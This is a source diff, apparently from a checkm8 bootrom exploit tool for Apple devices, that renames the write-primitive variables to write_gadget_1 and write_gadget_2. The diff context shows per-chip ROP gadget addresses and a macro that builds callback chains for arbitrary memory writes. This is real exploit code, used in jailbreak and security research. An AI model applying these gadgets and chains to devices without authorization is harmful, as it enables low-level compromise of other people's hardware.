@@ -25,7 +25,7 @@ static const char *pwnd_str = " YOLO:checkra1n";
 
 static size_t config_hole, config_overwrite_pad;
 static uint64_t insecure_memory_base;
-static uint64_t func_gadget, write_prim, write_prim2, arm_clean_invalidate_dcache_line, arm_invalidate_icache, enter_critical_section, exit_critical_section, write_ttbr0, tlbi, TTBR0_PATCH_BASE, TTBR0_BASE, bootstrap_task_lr, payload_start_offset;
+static uint64_t func_gadget, write_gadget_1, write_gadget_2, arm_clean_invalidate_dcache_line, arm_invalidate_icache, enter_critical_section, exit_critical_section, write_ttbr0, tlbi, TTBR0_PATCH_BASE, TTBR0_BASE, bootstrap_task_lr, payload_start_offset;
 
 static bool checkm8_check_usb_device(usb_handle_t *handle,
                                      void *pwned)
@@ -47,7 +47,7 @@ static bool checkm8_check_usb_device(usb_handle_t *handle,
             
             insecure_memory_base                = 0x180380000;
             func_gadget                         = 0x100010df4;
-            write_prim                          = 0x10000ed5c;
+            write_gadget_1                      = 0x10000ed5c;
             arm_clean_invalidate_dcache_line    = 0x100000448;
             arm_invalidate_icache               = 0x100000424;
             bootstrap_task_lr                   = 0x1800c2f68;
@@ -59,7 +59,7 @@ static bool checkm8_check_usb_device(usb_handle_t *handle,
             
             insecure_memory_base                = 0x180380000;
             func_gadget                         = 0x10000ddf4;
-            write_prim                          = 0x10000bc2c;
+            write_gadget_1                      = 0x10000bc2c;
             arm_clean_invalidate_dcache_line    = 0x100000448;
             arm_invalidate_icache               = 0x100000424;
             bootstrap_task_lr                   = 0x1800c2f68;
@@ -71,7 +71,7 @@ static bool checkm8_check_usb_device(usb_handle_t *handle,
             
             insecure_memory_base                = 0x180380000;
             func_gadget                         = 0x10000de0c;
-            write_prim2                         = 0x100001bc0;
+            write_gadget_2                      = 0x100001bc0;
             arm_clean_invalidate_dcache_line    = 0x10000042c;
             arm_invalidate_icache               = 0x100000408;
             bootstrap_task_lr                   = 0x1800c2f58;
@@ -84,7 +84,7 @@ static bool checkm8_check_usb_device(usb_handle_t *handle,
             
             insecure_memory_base                = 0x180380000;
             func_gadget                         = 0x10000de0c;
-            write_prim2                         = 0x100001bc0;
+            write_gadget_2                      = 0x100001bc0;
             arm_clean_invalidate_dcache_line    = 0x10000042c;
             arm_invalidate_icache               = 0x100000408;
             bootstrap_task_lr                   = 0x1800c2f58;
@@ -97,7 +97,7 @@ static bool checkm8_check_usb_device(usb_handle_t *handle,
             
             insecure_memory_base                = 0x180000000;
             func_gadget                         = 0x10000cd38;
-            write_prim2                         = 0x100001a78;
+            write_gadget_2                      = 0x100001a78;
             arm_clean_invalidate_dcache_line    = 0x10000043c;
             arm_invalidate_icache               = 0x100000418;
             enter_critical_section              = 0x100009b24;
@@ -116,7 +116,7 @@ static bool checkm8_check_usb_device(usb_handle_t *handle,
             
             insecure_memory_base                = 0x1800B0000;
             func_gadget                         = 0x10000cc44;
-            write_prim2                         = 0x100001808;
+            write_gadget_2                      = 0x100001808;
             arm_clean_invalidate_dcache_line    = 0x10000046c;
             arm_invalidate_icache               = 0x100000448;
             enter_critical_section              = 0x10000A4B8;
@@ -135,7 +135,7 @@ static bool checkm8_check_usb_device(usb_handle_t *handle,
             
             insecure_memory_base                = 0x1800B0000;
             func_gadget                         = 0x10000cce4;
-            write_prim2                         = 0x100001804;
+            write_gadget_2                      = 0x100001804; // str w9, [x8]
             arm_clean_invalidate_dcache_line    = 0x10000047c;
             arm_invalidate_icache               = 0x100000458;
             enter_critical_section              = 0x10000a658;
@@ -154,7 +154,7 @@ static bool checkm8_check_usb_device(usb_handle_t *handle,
             
             insecure_memory_base                = 0x18001C000;
             func_gadget                         = 0x10000a998;
-            write_prim                          = 0x100009c48;
+            write_gadget_1                      = 0x100009c48; // str w10, [x8, #4]
             arm_clean_invalidate_dcache_line    = 0x1000004e4;
             arm_invalidate_icache               = 0x1000004c0;
             enter_critical_section              = 0x10000f958;
@@ -173,7 +173,7 @@ static bool checkm8_check_usb_device(usb_handle_t *handle,
             
             insecure_memory_base                = 0x18001C000;
             func_gadget                         = 0x100008d8c;
-            write_prim                          = 0x100008058;
+            write_gadget_1                      = 0x100008058;
             arm_clean_invalidate_dcache_line    = 0x1000004cc;
             arm_invalidate_icache               = 0x1000004a8;
             enter_critical_section              = 0x10000f9b8;
@@ -428,12 +428,12 @@ if(!end)cb->next = base_address + nextOffset; \
 uint64_t* ptr = (uint64_t*)(cb); \
 uint32_t* ptr32 = (uint32_t*)(cb); \
 ptr[15] = func; \
-if(func == write_prim) \
+if(func == write_gadget_1) \
 { \
 ptr[14] = (uint64_t)(arg0 - 4); \
 ptr32[5] = (uint32_t)arg1; \
 } \
-else if(func == write_prim2) \
+else if(func == write_gadget_2) \
 { \
 ptr[14] = (uint64_t)arg0; \
 ptr32[5] = (uint32_t)arg1; \
@@ -457,11 +457,11 @@ goto fail; \
 
     if((cpid == 0x8015) || (cpid == 0x8012) || (cpid == 0x7001) || (cpid == 0x7000))
     {
-        write_gadget = write_prim;
+        write_gadget = write_gadget_1;
     }
     else
     {
-        write_gadget = write_prim2;
+        write_gadget = write_gadget_2;
     }
     
     uint64_t vrom_address = 0x100000000;
